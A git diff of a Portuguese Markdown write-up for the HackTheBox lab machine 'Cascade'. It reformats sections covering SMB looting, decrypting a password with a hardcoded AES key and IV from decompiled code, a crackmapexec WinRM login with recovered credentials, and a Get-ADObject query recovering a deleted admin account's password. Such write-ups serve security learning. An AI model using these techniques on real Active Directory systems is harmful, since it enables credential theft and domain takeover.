@@ -1,3 +1,16 @@
+1. [Resolução da máquina **Cascade**](#resolução-da-máquina-cascade) 1. [Máquina Medium (hackthebox.com)](#máquina-medium-hacktheboxcom) 2. [by **_JavaliMZ_** - 21/09/2021](#by-javalimz---21092021)
+2. [Enumeração](#enumeração)
+    1. [Nmap](#nmap)
+    2. [RDP](#rdp)
+    3. [GetNPUsers.py](#getnpuserspy)
+    4. [LDAPSearch](#ldapsearch)
+3. [PrivEsc](#privesc)
+    1. [SMBClient](#smbclient)
+    2. [sqlite3](#sqlite3)
+    3. [dotPeek (JetBrains)](#dotpeek-jetbrains)
+        1. [Decrypt Password](#decrypt-password)
+    4. [PrivEsc](#privesc-1)
+
 ![](Assets/HTB-Windows-Medium-Cascade/icon.webp)
 
 <img src="https://img.shields.io/badge/Cascade-HackTheBox-green?style=plastic" width="200">
@@ -181,13 +194,13 @@ smb: \> prompt off
 smb: \> recurse on
 mget *
 ```
-Existem 2 ficheiros interessantes:
-	-	"IT/Email Archives/Meeting_Notes_June_2018.html"
-	-   "IT/Temp/s.smith/VNC Install.reg"
+
+Existem 2 ficheiros interessantes: - "IT/Email Archives/Meeting_Notes_June_2018.html" - "IT/Temp/s.smith/VNC Install.reg"
 
 O ficheiro html contem informações de que existiu um usuário temporário de nome "TempAdmin" com uma nota (password is the same as the normal admin account password). Se por alguma razão conseguirmos obter a palavra passe se TempAdmin, provavelmente será a mesma de Administrator...
 
 > Ficheiro Meeting_Notes_June_2018.html
+
 ```txt
 From:���������������������������������������� Steve Smith
 
@@ -197,11 +210,11 @@ Sent:�������������������������
 
 Subject:������������������������������������ Meeting Notes
 
- 
+
 
 For anyone that missed yesterday�s meeting (I�m looking at you Ben). Main points are below:
 
- 
+
 
 -- New production network will be going live on Wednesday so keep an eye out for any issues.
 
@@ -209,11 +222,10 @@ For anyone that missed yesterday�s meeting (I�m looking at you Ben). Main po
 
 -- The winner of the �Best GPO� competition will be announced on Friday so get your submissions in soon.
 
- 
+
 
 Steve
 ```
-
 
 Na pasta IT/Temp/s.smith, o arquivo VNC contém uma password em hexadecimal.
 
@@ -291,21 +303,21 @@ Vemos que, na linha 39, o programa connecta-se à base de dados, como prevíamos
 
 Na linha 39 do Crypto.cs é que está definido a função "**_DecryptString_**". E dái já vemos muitas informações.
 
-	-	Crypto.DecryptString(EncryptedString, "c4scadek3y654321");  (MainModule.cs)
-		-	O trabalho de desencriptação parte daí
-	-   public static string DecryptString(string EncryptedString, string Key);
-		-	Isto é o nome da função, e os seus argumentos. a Key usada foi a que está em cima em texto claro ("c4scadek3y654321")
-	-   byte[] buffer = Convert.FromBase64String(EncryptedString);
-		-	Confirma-se que a palavra passe que encontramos na base de dados está em base64, pois o programa está a descodificar antes de tratá-lo
-	-	Aes aes = Aes.Create();
-		-	Aes é um tipo de criptografia de dados...
-		-	Aes é amplamente usado por ser um tipo de criptografia virtualmente inquebrável, que levaria vidas inteiras para decifrá-la por brute force... Mas com o código fonte, a coisa muda...
-	-	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
-		-
-	-	aes.Mode = CipherMode.CBC;
-		-	O método de codificação usado é o CBC cipher
-	-	aes.Key = Encoding.UTF8.GetBytes(Key);
-		-	confirma-se da situação da Key ser "c4scadek3y654321"
+    -	Crypto.DecryptString(EncryptedString, "c4scadek3y654321");  (MainModule.cs)
+    	-	O trabalho de desencriptação parte daí
+    -   public static string DecryptString(string EncryptedString, string Key);
+    	-	Isto é o nome da função, e os seus argumentos. a Key usada foi a que está em cima em texto claro ("c4scadek3y654321")
+    -   byte[] buffer = Convert.FromBase64String(EncryptedString);
+    	-	Confirma-se que a palavra passe que encontramos na base de dados está em base64, pois o programa está a descodificar antes de tratá-lo
+    -	Aes aes = Aes.Create();
+    	-	Aes é um tipo de criptografia de dados...
+    	-	Aes é amplamente usado por ser um tipo de criptografia virtualmente inquebrável, que levaria vidas inteiras para decifrá-la por brute force... Mas com o código fonte, a coisa muda...
+    -	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+    	-
+    -	aes.Mode = CipherMode.CBC;
+    	-	O método de codificação usado é o CBC cipher
+    -	aes.Key = Encoding.UTF8.GetBytes(Key);
+    	-	confirma-se da situação da Key ser "c4scadek3y654321"
 
 Resumo: - AES - Key == "c4scadek3y654321" - IV == "1tdyjCbY1Ix49842" - Mode == "CBC"
 
@@ -331,13 +343,14 @@ crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
 #>  WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
 #>  WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
 ```
+
 Temos capacidade de entrar na máquina via evil-winrm!
 
 ## PrivEsc
 
 ![Evil-winrm de arksvc](Assets/HTB-Windows-Medium-Cascade/evil-winrm-arksvc.png)
 
-A ultima fase para escalar privilégios até administrador é a seguinte: Este usuário está no grupo "*CASCADE\AD Recycle Bin*". Isto permite ver todos os objectos do active directory que foram removidos. Isto inclui o tal usuário TempAdmin, cuja a sua password poderá ser a mesma do que a do Administrator.
+A ultima fase para escalar privilégios até administrador é a seguinte: Este usuário está no grupo "_CASCADE\AD Recycle Bin_". Isto permite ver todos os objectos do active directory que foram removidos. Isto inclui o tal usuário TempAdmin, cuja a sua password poderá ser a mesma do que a do Administrator.
 
 Para reaver todos os objectos removidos, basta uma linha de comando...
 
@@ -345,13 +358,14 @@ Para reaver todos os objectos removidos, basta uma linha de comando...
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 
-Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por "**LegacyPwd e CanonicalName**"
-´
+Á resposta deste comando nesta máquina não é muito grande... mas normalmente é enorme. Por isso, recomendo exportar para um ficheiro, fazer o download deste para a nossa maquina, e fazer um grep por "**LegacyPwd e CanonicalName**" ´
+
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * > output.txt
 # Pelo evil-winrm, é possível fazer donwload e upload directamente com a ferramenta:
 download "C:/Users/arksvc/Documents/output.txt"
 ```
+
 ```bash
 # kali
 cat output.txt | grep -Ei "Legacypwd|canonicalName"
